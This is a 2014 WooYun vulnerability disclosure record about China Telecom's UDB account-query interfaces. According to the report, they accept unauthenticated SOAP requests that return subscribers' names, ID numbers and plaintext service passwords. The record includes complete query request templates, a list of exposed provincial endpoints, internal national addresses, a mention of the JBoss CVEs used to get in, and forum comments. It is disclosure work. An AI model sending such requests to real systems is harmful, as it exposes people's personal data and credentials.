{"id": 2118, "wybug_id": "wooyun-2014-066838", "wybug_title": "中国电信全国用户数据库接口配置不当允许任意查询(可查全国机主姓名、身份证、明文服务密码等信息)", "wybug_corp": "中国电信", "wybug_author": "hacker@sina.cn", "wybug_date": "2014-07-01 12:22", "wybug_open_date": "2014-08-15 12:24", "wybug_type": "未授权访问/权限绕过", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["中国电信的菊花"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向公众公开  简要描述： 献礼七一，爱党爱国！ 详细说明：  根据电信UDB规划发展说明，接口共分2套，即 “全国-/-省级”,UDB是实现中国电信统一账号的基础支撑平台。UDB系统将中国电信原有的各个独立的业务应用平台整合成一个庞大的服务平台，该平台以统一账号为中心对用户账号、密码进行集中维护和统一认证。省级接口基于华为BME系统实施构建,因BME早期版本存在JBoss漏洞:(CVE 2010-0738)(CVE 2013-4810)黑客可以利用漏洞EXP直接打击BME系统，上传网页木马。通过对这套系统的分析调查，结合《中国电信用户数据库-接口与流程规范 v2.0》http://wenku.baidu.com/view/b698f316f18583d0496459b3.html，我们可以得知其功能/逻辑为：\n\n\n\n这意味着本省UDB的BME系统只能查询本省机主用户信息，而全国UDB接口则可通过递归查询获取任意省份机主的用户信息。对于安全保障方面，根据规范描述，应严格做好接口访问调用的限制，但事实上并非如此！\n\n正是缺失了对查询调用方的IP验证机制，直接导致任意用户都可以通过提交SOAP消息到查询接口，请求BME系统查询机主的帐户信息。最近测试发现全国的BME系统都升级了，修补了JBOSS漏洞的问题，索性就把漏洞公布出来，希望加强重视，但不排除黑客还有其他通道获取该服务器的权限，或能够访问到全国UDB接口的处于电信核心区域的服务器权限。还是要加强边界防范，增强验证机制。毕竟这套系统的功能并不仅限于查询信息，所有的用户业务开通、办理、缴续费等都依靠着该系统，一旦接口防范不严导致任意访问，兹事体大。   漏洞证明：  省级接口：通过漏洞进入BME系统服务器后，获取管理员的帐号密码登录该系统，后台具有帐号查询的功能，可查询本省机主信息，并通过抓包分析，可以找到其直接调用的查询接口，该接口可外部任意用户访问，而无需登录BME或验证IP。\n\n\n\n示例后台：http://bj.passport.189.cn:8080/BME/frameset/login.action示例接口：http://bj.passport.189.cn:8080/BME/services/\t     // 提供的服务列表http://bj.passport.189.cn:8080/BME/services/UDBCommonSoap查询实例：\nPOST /BME/services/UDBCommonSoap HTTP/1.1Host: bj.passport.189.cn:8080Content-Type: text/xml; charset=utf-8Content-Length: 518SOAPAction: \"http://bj.passport.189.cn:8080/AccountInfoQuery\"<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">  <soap:Body>    <AccountInfoQuery xmlns=\"http://bj.passport.189.cn:8080/\">\t<srcSsDeviceNo>1000000000000001</srcSsDeviceNo>\t<querySsDeviceNo>1000000000000001</querySsDeviceNo>\t<userID>电话号码</userID>\t<queryInfoType>0</queryInfoType>    </AccountInfoQuery>  </soap:Body></soap:Envelope>\n整理出存在匿名查询问题的省份UDB接口列表：http://jl.passport.189.cn:8080/BME/services/UDBCommonSoap     吉林http://ln.passport.189.cn:8080/BME/services/UDBCommonSoap     辽宁http://hb.passport.189.cn:8080/BME/services/UDBCommonSoap     湖北http://jx.passport.189.cn:18080/BME/services/UDBCommonSoap     江西http://js.passport.189.cn:18080/BME/services/UDBCommonSoap    江苏http://sd.passport.189.cn:8080/BME/services/UDBCommonSoap     山东http://bj.passport.189.cn:8080/BME/services/UDBCommonSoap       北京全国接口：可以从任意省份BME系统中获取到全国-省级UDB查询接口，此接口服务器位于电信大内网中，无法从外部访问，任意省份BME服务器均可访问，如果有一个省沦陷，意味着黑客就可以掌控全国UDB的查询权限。\n\n\n\n全国UDB接口内网地址(各省passport.189.cn服务器均可访问)：http://10.235.198.60:8810/UDBCommon/UDBCommon.asmx?WSDLhttp://10.235.198.60:8810/UDBCommon/UDBCommon.asmx?op=RegisterQueryInfohttp://10.235.198.60:8810/ProvinceNational/ProvinceNational.asmx?WSDL查询实例：\nPOST /UDBCommon/UDBCommon.asmx HTTP/1.1Host: 10.235.198.60:8810Content-Type: text/xml; charset=utf-8Content-Length: 547SOAPAction: \"http://udb.chinatelecom.com/AccountInfoQuery\"<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">  <soap:Body>    <AccountInfoQueryRequest xmlns=\"http://udb.chinatelecom.com\">      <SrcSsDeviceNo>3500000000000001</SrcSsDeviceNo>      <QuerySsDeviceNo>3500000000000001</QuerySsDeviceNo>      <UserID>电话号码</UserID>      <QueryInfoType>0</QueryInfoType>    </AccountInfoQueryRequest>  </soap:Body></soap:Envelope>\n   修复方案：  1.自己写的东西就应该按照其去实施，别不当回事，说得总比做的好2.实时关注产品组件的漏洞披露及补丁发布情况   版权声明：转载请注明来源 hacker@sina.cn@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-06 10:51 厂商回复： CNVD确认并在某个省份复现所述情况，其余省份已经同步转由分中心确认，已经转由CNCERT直接通报给中国电信集团公司处置。按信息泄露风险评分，rank 20 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-01 12:22 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  咔嚓！！    \n     2014-07-01 12:24 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  大牛  教俺挖洞可好...    \n     2014-07-01 12:24 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  卧槽    \n     2014-07-01 12:28 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  叼炸天啊    \n     2014-07-01 12:31 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  屌    \n     2014-07-01 12:37 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  前排，坐等中枪    \n     2014-07-01 12:38 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  先跪拜一下！·    \n     2014-07-01 12:39 |    \t\t晓海’ \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:3        | 一个IT界的酱油帝，坚信分享，创造未来！)\t\t \n  全国？这规模也太大了吧？    \n     2014-07-01 12:48 |    \t\tMoc \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | 屌丝何苦为难屌丝)\t\t \n  怎一个屌字了的    \n     2014-07-01 13:04 |    \t\t走火入魔 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:2        | 多读书，多看报，少吃零食，多睡觉。)\t\t \n  怎一个屌字了的     \n     2014-07-01 13:08 |    \t\tabcdlzy \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:14        | 好好学习，天天向上。)\t\t \n  这是膝盖中了几箭的节奏么？    \n     2014-07-01 13:11 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  还好我没手机     \n     2014-07-01 13:20 |    \t\t小螺号 \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 小螺号呀嘀嘀的~~~~~~吹)\t\t \n  我只挖到了一个省的  你厉害     \n     2014-07-01 13:22 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:29        | 是金子总会发光，在还未发光之前，先打磨打...)\t\t \n  神奇的路人甲    \n     2014-07-01 13:22 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:24        | 求传授刷Rank方法？)\t\t \n  碉堡了    \n     2014-07-01 13:29 |    \t\tMarkGUN \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 我是GONG，因为我喜欢一切美好的东西，但是...)\t\t \n  牛逼了，路人甲威武    \n     2014-07-01 13:30 |    \t\tMarkGUN \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 我是GONG，因为我喜欢一切美好的东西，但是...)\t\t \n  @小螺号 你挖到那个省的了，我也去挖下，避免我们不产生碰撞！    \n     2014-07-01 13:33 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-07-01 14:06 |    \t\t0749orz \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:4        | 厌了，烦了~~~)\t\t \n  牛B， 了，，别查我家水表。。。我拆 了    \n     2014-07-01 14:32 |    \t\tonlycjeg \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:5        | 我就看看,我不说话.)\t\t \n  献礼七一，爱党爱国！    \n     2014-07-01 15:01 |    \t\t芙兰朵露斯卡雷特 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 看我闪现逃走闪现逃走六不六)\t\t \n  卧槽！    \n     2014-07-01 15:04 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  日    \n     2014-07-01 15:31 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  吓死我了。    \n     2014-07-01 15:34 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  反正我木有用电信，哇卡卡卡~~    \n     2014-07-01 16:55 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  weiguan    \n     2014-07-01 17:56 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  服务密码6个数字也明文……用的不是整型吧……    \n     2014-07-01 20:53 |    \t\t爱Gail \t\t\t( 普通白帽子  |\t\t\t        Rank:237 漏洞数:38        | 爱漏洞、爱编程、爱旅游、爱Gail)\t\t \n  这个比较强    \n     2014-07-01 21:19 |    \t\tLucien \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一个普通用户)\t\t \n  我擦！    \n     2014-07-01 21:26 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  打酱油的！    \n     2014-07-02 11:04 |    \t\t兔兔侠 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  哇果断求看看    \n     2014-07-02 15:50 |    \t\t飞鸡 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 看，有飞鸡)\t\t \n  我勒个去    \n     2014-07-02 18:44 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  果断收藏    \n     2014-07-06 18:47 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  高rank~~等细节    \n     2014-07-26 11:14 |    \t\tPythonPig \t\t\t( 普通白帽子  |\t\t\t        Rank:491 漏洞数:71        | 只会简单工具的小小菜)\t\t \n  神奇的路人甲    \n     2014-07-29 10:11 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  你要想想这是华为去做的。不是我有意说他们，他们的开发有的很自大，觉得这个不是问题那个也不是问题，都不愿意改。    \n     2014-08-15 04:39 |    \t\t汪哥 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:6        )\t\t \n  吓死了    \n     2014-08-15 15:17 |    \t\t半夏 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 新人一枚。。)\t\t \n  哇擦  老NB啦    \n     2014-08-15 15:40 |    \t\t迦南 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:11        | 我不是玩黑，我就是认真)\t\t \n  楼上+1    \n     2014-08-15 16:13 |    \t\tCoffeeSafe \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:37        )\t\t \n  来我们中国电信上班吧~哈哈哈    \n     2014-08-21 09:05 |    \t\tJack.Chalres \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:15        | ..............)\t\t \n  好屌    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}